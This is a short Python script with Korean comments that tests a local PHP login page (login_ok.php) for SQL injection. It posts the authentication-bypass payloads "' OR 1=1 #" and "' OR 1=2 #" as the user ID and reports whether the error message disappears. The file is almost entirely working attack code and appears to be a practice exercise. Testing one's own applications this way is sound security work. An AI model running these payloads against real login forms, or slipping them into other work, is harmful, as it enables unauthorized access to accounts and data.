import requests	# post(),status_code 사용하기 위해

# SQL Injection을 사용할 url 입력
url = "http://localhost/login_ok.php"	
# Request에서 전달되는 파라미터를 딕셔너리형 변수로 저장
data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
# 사이트에 가입 후 가입한 아이디를 입력 받을 변수
selId = input("ID 입력 : \n")

def testSql():
    checkSql =["' OR 1=1 #", "' OR 1=2 #"]
    checkArr = [0, 0]
    for i in range(0,2):
        data["user_id"] = checkSql[i]
        req = requests.post(url, data=data)
        print(req.text)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                checkArr[i] = True
            else:
                checkArr[i] = False    

    print(checkSql[0],checkArr[0])
    print(checkSql[1],checkArr[1])


def main():
    testSql()
        
if __name__ == "__main__":
    main()